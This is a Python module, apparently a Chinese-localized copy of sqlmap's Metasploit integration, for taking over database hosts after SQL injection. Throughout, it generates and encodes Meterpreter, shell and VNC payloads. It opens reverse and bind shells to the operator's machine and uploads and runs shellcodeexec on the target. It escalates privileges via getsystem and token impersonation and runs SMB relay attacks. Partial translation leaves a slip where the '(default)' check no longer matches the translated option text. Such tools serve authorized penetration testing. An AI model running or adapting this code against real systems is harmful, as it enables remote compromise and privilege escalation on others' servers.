#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import errno
import os
import re
import select
import sys
import tempfile
import time

from subprocess import PIPE

from extra.cloak.cloak import cloak
from extra.cloak.cloak import decloak
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import isDigit
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import pollProcess
from lib.core.common import randomRange
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import getBytes
from lib.core.convert import getText
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapGenericException
from lib.core.settings import IS_WIN
from lib.core.settings import METASPLOIT_SESSION_TIMEOUT
from lib.core.settings import SHELLCODEEXEC_RANDOM_STRING_MARKER
from lib.core.subprocessng import blockingReadFromFD
from lib.core.subprocessng import blockingWriteToFD
from lib.core.subprocessng import Popen as execute
from lib.core.subprocessng import send_all
from lib.core.subprocessng import recv_some
from thirdparty import six

if IS_WIN:
    import msvcrt

class Metasploit(object):
    """
    This class defines methods to call Metasploit for plugins.
    """

    def _initVars(self):
        self.connectionStr = None
        self.lhostStr = None
        self.rhostStr = None
        self.portStr = None
        self.payloadStr = None
        self.encoderStr = None
        self.payloadConnStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli%s" % (".bat" if IS_WIN else "")))
        self._msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole%s" % (".bat" if IS_WIN else "")))
        self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode%s" % (".bat" if IS_WIN else "")))
        self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload%s" % (".bat" if IS_WIN else "")))
        self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom%s" % (".bat" if IS_WIN else "")))

        self._msfPayloadsList = {
            "windows": {
                1: ("Meterpreter (默認)", "windows/meterpreter"),
                2: ("Shell", "windows/shell"),
                3: ("VNC", "windows/vncinject"),
            },
            "linux": {
                1: ("Shell (默認)", "linux/x86/shell"),
                2: ("Meterpreter (beta)", "linux/x86/meterpreter"),
            }
        }

        self._msfConnectionsList = {
            "windows": {
                1: ("反向 TCP：從數據庫主機連接到此計算機（默認）", "reverse_tcp"),
                2: ("反向 TCP：嘗試在指定和 65535 之間的所有端口上從數據庫主機連接回此計算機", "reverse_tcp_allports"),
                3: ("反向 HTTP：通過 HTTP 隧道傳輸流量，從數據庫主機連接到此計算機", "reverse_http"),
                4: ("反向 HTTPS：通過 HTTPS 隧道傳輸流量，從數據庫主機連接到此計算機", "reverse_https"),
                5: ("綁定 TCP：在數據庫主機上監聽連接", "bind_tcp"),
            },
            "linux": {
                1: ("反向 TCP：從數據庫主機連接到此計算機（默認）", "reverse_tcp"),
                2: ("綁定 TCP：在數據庫主機上監聽連接", "bind_tcp"),
            }
        }

        self._msfEncodersList = {
            "windows": {
                1: ("無編碼器", "generic/none"),
                2: ("Alpha2 字母數字混合編碼", "x86/alpha_mixed"),
                3: ("Alpha2 字母數字大寫編碼器", "x86/alpha_upper"),
                4: ("避免 UTF8/小寫轉換", "x86/avoid_utf8_tolower"),
                5: ("Call+4 雙字異或編碼器", "x86/call4_dword_xor"),
                6: ("單字節異或倒計時編碼器", "x86/countdown"),
                7: ("變長 Fnstenv/mov 雙字異或編碼器", "x86/fnstenv_mov"),
                8: ("多態跳轉/調用 異或加性反饋編碼器", "x86/jmp_call_additive"),
                9: ("非字母編碼器", "x86/nonalpha"),
                10: ("非大寫字母編碼器", "x86/nonupper"),
                11: ("多態異或加性反饋編碼器（默認）", "x86/shikata_ga_nai"),
                12: ("Alpha2 字母數字 Unicode 混合大小寫編碼器", "x86/unicode_mixed"),
                13: ("Alpha2 字母數字 Unicode 大寫編碼器", "x86/unicode_upper"),
            }
        }

        self._msfSMBPortsList = {
            "windows": {
                1: ("139/TCP", "139"),
                2: ("445/TCP (default)", "445"),
            }
        }

        self._portData = {
            "bind": "remote port number",
            "reverse": "local port number",
        }

    def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
        if Backend.isOs(OS.WINDOWS):
            opSys = "windows"
        else:
            opSys = "linux"

        message = "你想要使用哪個 %s？" % msg

        if lst:
            for num, data in lst[opSys].items():
                description = data[0]

                if num > maxValue:
                    maxValue = num

                if "(default)" in description:
                    default = num

                message += "\n[%d] %s" % (num, description)
        else:
            message += " [%d] " % default

        choice = readInput(message, default="%d" % default)

        if not choice or not isDigit(choice) or int(choice) > maxValue or int(choice) < 1:
            choice = default

        choice = int(choice)

        if lst:
            choice = lst[opSys][choice][1]

        return choice

    def _selectSMBPort(self):
        return self._skeletonSelection("SMB port", self._msfSMBPortsList)

    def _selectEncoder(self, encode=True):
        # This is always the case except for --os-bof where the user can
        # choose which encoder to use. When called from --os-pwn the encoder
        # is always x86/alpha_mixed - used for sys_bineval() and
        # shellcodeexec
        if isinstance(encode, six.string_types):
            return encode

        elif encode:
            return self._skeletonSelection("payload encoding", self._msfEncodersList)

    def _selectPayload(self):
        if Backend.isOs(OS.WINDOWS) and conf.privEsc:
            infoMsg = "強制使用 Meterpreter 作為 Metasploit 載荷,因為它是唯一可以通過'incognito'擴展、'getsystem'命令或後置模塊提升權限的載荷"
            #infoMsg += "it is the only payload that can be used to "
            #infoMsg += "escalate privileges via 'incognito' extension, "
            #infoMsg += "'getsystem' command or post modules"
            logger.info(infoMsg)

            _payloadStr = "windows/meterpreter"
        else:
            _payloadStr = self._skeletonSelection("payload", self._msfPayloadsList)

        if _payloadStr == "windows/vncinject":
            choose = False

            if Backend.isDbms(DBMS.MYSQL):
                debugMsg = "默認情況下,Windows 上的 MySQL 運行為 SYSTEM 用戶,VNC 注入很可能會成功"
                #debugMsg += "user, it is likely that the VNC "
                #debugMsg += "injection will be successful"
                logger.debug(debugMsg)

            elif Backend.isDbms(DBMS.PGSQL):
                choose = True

                warnMsg = "默認情況下,Windows 上的 PostgreSQL 運行為 postgres 用戶,VNC 注入很可能不會成功"
                #warnMsg += "postgres user, it is unlikely that the VNC "
                #warnMsg += "injection will be successful"
                logger.warning(warnMsg)

            elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                choose = True

                warnMsg = "VNC 注入很可能不會成功,因為通常 Microsoft SQL Server %s 運行為 Network Service 用戶或管理員未登錄" % Backend.getVersion()
                #warnMsg += "successful because usually Microsoft SQL Server "
                #warnMsg += "%s runs as Network Service " % Backend.getVersion()
                #warnMsg += "or the Administrator is not logged in"
                logger.warning(warnMsg)

            if choose:
                message = "您想要做什麼？\n"
                message += "[1] 無論如何都嘗試\n"
                message += "[2] 回退到 Meterpreter 載荷 (默認)\n"
                message += "[3] 回退到 Shell 載荷"

                while True:
                    choice = readInput(message, default="2")

                    if not choice or choice == "2":
                        _payloadStr = "windows/meterpreter"
                        break

                    elif choice == "3":
                        _payloadStr = "windows/shell"
                        break

                    elif choice == "1":
                        if Backend.isDbms(DBMS.PGSQL):
                            logger.warning("請注意,VNC 注入可能無法正常工作")
                            break

                        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                            break

                    elif not isDigit(choice):
                        logger.warning("無效的值,只允許輸入數字")

                    elif int(choice) < 1 or int(choice) > 2:
                        logger.warning("無效的值,必須為 1 或 2")

        if self.connectionStr.startswith("reverse_http") and _payloadStr != "windows/meterpreter":
            warnMsg = "僅支持 Meterpreter 載荷的反向 HTTP%s 連接。回退到反向 TCP" % ("S" if self.connectionStr.endswith("s") else "")
            #warnMsg += "with the Meterpreter payload. Falling back to "
            #warnMsg += "reverse TCP"
            logger.warning(warnMsg)

            self.connectionStr = "reverse_tcp"

        return _payloadStr

    def _selectPort(self):
        for connType, connStr in self._portData.items():
            if self.connectionStr.startswith(connType):
                return self._skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))

    def _selectRhost(self):
        if self.connectionStr.startswith("bind"):
            message = "後端 DBMS 的地址是什麼？[按回車鍵使用默認值 '%s'(檢測到的值)] " % self.remoteIP
            address = readInput(message, default=self.remoteIP)

            if not address:
                address = self.remoteIP

            return address

        elif self.connectionStr.startswith("reverse"):
            return None

        else:
            raise SqlmapDataException("意外連接類型")

    def _selectLhost(self):
        if self.connectionStr.startswith("reverse"):
            message = "本地地址是什麼？[按回車鍵使用默認值 '%s'(檢測到的值)] " % self.localIP
            address = readInput(message, default=self.localIP)

            if not address:
                address = self.localIP

            return address

        elif self.connectionStr.startswith("bind"):
            return None

        else:
            raise SqlmapDataException("意外連接類型")

    def _selectConnection(self):
        return self._skeletonSelection("connection type", self._msfConnectionsList)

    def _prepareIngredients(self, encode=True):
        self.connectionStr = self._selectConnection()
        self.lhostStr = self._selectLhost()
        self.rhostStr = self._selectRhost()
        self.portStr = self._selectPort()
        self.payloadStr = self._selectPayload()
        self.encoderStr = self._selectEncoder(encode)
        self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)

    def _forgeMsfCliCmd(self, exitfunc="process"):
        if kb.oldMsf:
            self._cliCmd = "%s multi/handler PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
            self._cliCmd += " EXITFUNC=%s" % exitfunc
            self._cliCmd += " LPORT=%s" % self.portStr

            if self.connectionStr.startswith("bind"):
                self._cliCmd += " RHOST=%s" % self.rhostStr
            elif self.connectionStr.startswith("reverse"):
                self._cliCmd += " LHOST=%s" % self.lhostStr
            else:
                raise SqlmapDataException("意外連接類型")

            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                self._cliCmd += " DisableCourtesyShell=true"

            self._cliCmd += " E"
        else:
            self._cliCmd = "%s -L -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
            self._cliCmd += "; set EXITFUNC %s" % exitfunc
            self._cliCmd += "; set LPORT %s" % self.portStr

            if self.connectionStr.startswith("bind"):
                self._cliCmd += "; set RHOST %s" % self.rhostStr
            elif self.connectionStr.startswith("reverse"):
                self._cliCmd += "; set LHOST %s" % self.lhostStr
            else:
                raise SqlmapDataException("意外連接類型")

            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                self._cliCmd += "; set DisableCourtesyShell true"

            self._cliCmd += "; exploit'"

    def _forgeMsfCliCmdForSmbrelay(self):
        self._prepareIngredients(encode=False)

        if kb.oldMsf:
            self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
            self._cliCmd += " EXITFUNC=thread"
            self._cliCmd += " LPORT=%s" % self.portStr
            self._cliCmd += " SRVHOST=%s" % self.lhostStr
            self._cliCmd += " SRVPORT=%s" % self._selectSMBPort()

            if self.connectionStr.startswith("bind"):
                self._cliCmd += " RHOST=%s" % self.rhostStr
            elif self.connectionStr.startswith("reverse"):
                self._cliCmd += " LHOST=%s" % self.lhostStr
            else:
                raise SqlmapDataException("意外連接類型")

            self._cliCmd += " E"
        else:
            self._cliCmd = "%s -x 'use windows/smb/smb_relay; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
            self._cliCmd += "; set EXITFUNC thread"
            self._cliCmd += "; set LPORT %s" % self.portStr
            self._cliCmd += "; set SRVHOST %s" % self.lhostStr
            self._cliCmd += "; set SRVPORT %s" % self._selectSMBPort()

            if self.connectionStr.startswith("bind"):
                self._cliCmd += "; set RHOST %s" % self.rhostStr
            elif self.connectionStr.startswith("reverse"):
                self._cliCmd += "; set LHOST %s" % self.lhostStr
            else:
                raise SqlmapDataException("意外連接類型")

            self._cliCmd += "; exploit'"

    def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
        if kb.oldMsf:
            self._payloadCmd = self._msfPayload
        else:
            self._payloadCmd = "%s -p" % self._msfVenom

        self._payloadCmd += " %s" % self.payloadConnStr
        self._payloadCmd += " EXITFUNC=%s" % exitfunc
        self._payloadCmd += " LPORT=%s" % self.portStr

        if self.connectionStr.startswith("reverse"):
            self._payloadCmd += " LHOST=%s" % self.lhostStr
        elif not self.connectionStr.startswith("bind"):
            raise SqlmapDataException("意外連接類型")

        if Backend.isOs(OS.LINUX) and conf.privEsc:
            self._payloadCmd += " PrependChrootBreak=true PrependSetuid=true"

        if kb.oldMsf:
            if extra == "BufferRegister=EAX":
                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)

                if extra is not None:
                    self._payloadCmd += " %s" % extra
            else:
                self._payloadCmd += " X > \"%s\"" % outFile
        else:
            if extra == "BufferRegister=EAX":
                self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)

                if extra is not None:
                    self._payloadCmd += " %s" % extra

                self._payloadCmd += " > \"%s\"" % outFile
            else:
                self._payloadCmd += " -f exe > \"%s\"" % outFile

    def _runMsfCliSmbrelay(self):
        self._forgeMsfCliCmdForSmbrelay()

        infoMsg = "正在本地運行 Metasploit Framework 命令行界面,請稍候..."
        #infoMsg += "interface locally, please wait.."
        logger.info(infoMsg)

        logger.debug("執行本地命令:%s" % self._cliCmd)
        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)

    def _runMsfCli(self, exitfunc):
        self._forgeMsfCliCmd(exitfunc)

        infoMsg = "正在本地運行 Metasploit Framework 命令行界面,請稍候..."
        #infoMsg += "interface locally, please wait.."
        logger.info(infoMsg)

        logger.debug("執行本地命令:%s" % self._cliCmd)
        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)

    def _runMsfShellcodeRemote(self):
        infoMsg = "正在通過 UDF 'sys_bineval'遠程運行 Metasploit Framework shellcode,請稍候..."
        #infoMsg += "remotely via UDF 'sys_bineval', please wait.."
        logger.info(infoMsg)

        self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")

    def _runMsfShellcodeRemoteViaSexec(self):
        infoMsg = "正在通過 shellcodeexec 遠程運行 Metasploit Framework shellcode,請稍候..."
        #infoMsg += "via shellcodeexec, please wait.."
        logger.info(infoMsg)

        if not Backend.isOs(OS.WINDOWS):
            self.execCmd("chmod +x %s" % self.shellcodeexecRemote, silent=True)
            cmd = "%s %s &" % (self.shellcodeexecRemote, self.shellcodeString)
        else:
            cmd = "\"%s\" %s" % (self.shellcodeexecRemote, self.shellcodeString)

        self.execCmd(cmd, silent=True)

    def _loadMetExtensions(self, proc, metSess):
        if not Backend.isOs(OS.WINDOWS):
            return

        send_all(proc, "use espia\n")
        send_all(proc, "use incognito\n")

        # This extension is loaded by default since Metasploit > 3.7:
        # send_all(proc, "use priv\n")

        # This extension freezes the connection on 64-bit systems:
        # send_all(proc, "use sniffer\n")

        send_all(proc, "sysinfo\n")
        send_all(proc, "getuid\n")

        if conf.privEsc:
            print()

            infoMsg = "嘗試使用 Meterpreter 'getsystem'命令提升權限,該命令嘗試使用不同的技術,包括 kitrap0d"
            #infoMsg += "'getsystem' command which tries different "
            #infoMsg += "techniques, including kitrap0d"
            logger.info(infoMsg)

            send_all(proc, "getsystem\n")

            infoMsg = "顯示可用的訪問令牌列表。如果'getsystem'無法成功提升權限,請使用 incognito 的'impersonate_token'命令選擇要模擬的用戶"
            #infoMsg += "Choose which user you want to impersonate by "
            #infoMsg += "using incognito's command 'impersonate_token' if "
            #infoMsg += "'getsystem' does not success to elevate privileges"
            logger.info(infoMsg)

            send_all(proc, "list_tokens -u\n")
            send_all(proc, "getuid\n")

    def _controlMsfCmd(self, proc, func):
        initialized = False
        start_time = time.time()
        stdin_fd = sys.stdin.fileno()

        while True:
            returncode = proc.poll()

            if returncode is None:
                # Child hasn't exited yet
                pass
            else:
                logger.debug("連接已正確關閉")
                return returncode

            try:
                if IS_WIN:
                    timeout = 3

                    inp = b""
                    _ = time.time()

                    while True:
                        if msvcrt.kbhit():
                            char = msvcrt.getche()

                            if ord(char) == 13:     # enter_key
                                break
                            elif ord(char) >= 32:   # space_char
                                inp += char

                        if len(inp) == 0 and (time.time() - _) > timeout:
                            break

                    if len(inp) > 0:
                        try:
                            send_all(proc, inp)
                        except (EOFError, IOError):
                            # Probably the child has exited
                            pass
                else:
                    ready_fds = select.select([stdin_fd], [], [], 1)

                    if stdin_fd in ready_fds[0]:
                        try:
                            send_all(proc, blockingReadFromFD(stdin_fd))
                        except (EOFError, IOError):
                            # Probably the child has exited
                            pass

                out = recv_some(proc, t=.1, e=0)
                blockingWriteToFD(sys.stdout.fileno(), getBytes(out))

                # For --os-pwn and --os-bof
                pwnBofCond = self.connectionStr.startswith("reverse")
                pwnBofCond &= any(_ in out for _ in (b"Starting the payload handler", b"Started reverse"))

                # For --os-smbrelay
                smbRelayCond = b"Server started" in out

                if pwnBofCond or smbRelayCond:
                    func()

                timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT

                if not initialized:
                    match = re.search(b"Meterpreter session ([\\d]+) opened", out)

                    if match:
                        self._loadMetExtensions(proc, match.group(1))

                        if "shell" in self.payloadStr:
                            send_all(proc, "whoami\n" if Backend.isOs(OS.WINDOWS) else "uname -a ; id\n")
                            time.sleep(2)

                        initialized = True
                    elif timeout:
                        proc.kill()
                        errMsg = "嘗試打開遠程會話時發生超時"
                        #errMsg += "to open a remote session"
                        raise SqlmapGenericException(errMsg)

            except select.error as ex:
                # Reference: https://github.com/andymccurdy/redis-py/pull/743/commits/2b59b25bb08ea09e98aede1b1f23a270fc085a9f
                if ex.args[0] == errno.EINTR:
                    continue
                else:
                    return proc.returncode
            except (EOFError, IOError):
                return proc.returncode
            except KeyboardInterrupt:
                pass

    def createMsfShellcode(self, exitfunc, format, extra, encode):
        infoMsg = "正在創建 Metasploit Framework 多階段 shellcode"
        logger.info(infoMsg)

        self._randStr = randomStr(lowercase=True)
        self._shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self._randStr)

        Metasploit._initVars(self)
        self._prepareIngredients(encode=encode)
        self._forgeMsfPayloadCmd(exitfunc, format, self._shellcodeFilePath, extra)

        logger.debug("執行本地命令:%s" % self._payloadCmd)
        process = execute(self._payloadCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)

        dataToStdout("\r[%s] [INFO] 正在創建中 " % time.strftime("%X"))
        pollProcess(process)
        payloadStderr = process.communicate()[1]

        match = re.search(b"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\\d]+)", payloadStderr)

        if match:
            payloadSize = int(match.group(2))

            if extra == "BufferRegister=EAX":
                payloadSize = payloadSize // 2

            debugMsg = "shellcode 大小為%d 字節" % payloadSize
            logger.debug(debugMsg)
        else:
            errMsg = "無法創建 shellcode('%s')" % getText(payloadStderr).replace("\n", " ").replace("\r", "")
            raise SqlmapFilePathException(errMsg)

        self._shellcodeFP = open(self._shellcodeFilePath, "rb")
        self.shellcodeString = getText(self._shellcodeFP.read())
        self._shellcodeFP.close()

        os.unlink(self._shellcodeFilePath)

    def uploadShellcodeexec(self, web=False):
        self.shellcodeexecLocal = os.path.join(paths.SQLMAP_EXTRAS_PATH, "shellcodeexec")

        if Backend.isOs(OS.WINDOWS):
            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
            content = decloak(self.shellcodeexecLocal)
            if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:
                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, getBytes(randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER))))
                _ = cloak(data=content)
                handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix="%s.exe_" % "32")
                os.close(handle)
                with open(self.shellcodeexecLocal, "w+b") as f:
                    f.write(_)
        else:
            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "linux", "shellcodeexec.x%s_" % Backend.getArch())

        __basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")

        self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
        self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))

        logger.info("將 shellcodeexec 上傳到'%s'" % self.shellcodeexecRemote)

        if web:
            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
        else:
            written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "上傳 shellcodeexec 時出現問題。似乎二進制文件未寫入數據庫底層文件系統,或者被防病毒軟件標記為惡意並刪除"
            #errMsg += "looks like the binary file has not been written "
            #errMsg += "on the database underlying file system or an AV has "
            #errMsg += "flagged it as malicious and removed it"
            logger.error(errMsg)

            return False
        else:
            logger.info("shellcodeexec 上傳成功")
            return True

    def pwn(self, goUdf=False):
        if goUdf:
            exitfunc = "thread"
            func = self._runMsfShellcodeRemote
        else:
            exitfunc = "process"
            func = self._runMsfShellcodeRemoteViaSexec

        self._runMsfCli(exitfunc=exitfunc)

        if self.connectionStr.startswith("bind"):
            func()

        #debugMsg = "Metasploit Framework command line interface exited "
        debugMsg = "Metasploit Framework 命令行界面退出,返回代碼為 %s" % self._controlMsfCmd(self._msfCliProc, func)
        logger.debug(debugMsg)

        if not goUdf:
            time.sleep(1)
            self.delRemoteFile(self.shellcodeexecRemote)

    def smb(self):
        Metasploit._initVars(self)
        self._randFile = "tmpu%s.txt" % randomStr(lowercase=True)

        self._runMsfCliSmbrelay()

        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            self.uncPath = r"\\\\%s\\%s" % (self.lhostStr, self._randFile)
        else:
            self.uncPath = r"\\%s\%s" % (self.lhostStr, self._randFile)

        debugMsg = "Metasploit Framework 控制檯退出,返回代碼為 %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
        #debugMsg += "code %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
        logger.debug(debugMsg)

    def bof(self):
        self._runMsfCli(exitfunc="seh")

        if self.connectionStr.startswith("bind"):
            self.spHeapOverflow()

        #debugMsg = "Metasploit Framework command line interface exited "
        debugMsg = "Metasploit Framework 命令行界面退出,返回代碼為 %s" % self._controlMsfCmd(self._msfCliProc, self.spHeapOverflow)
        logger.debug(debugMsg)
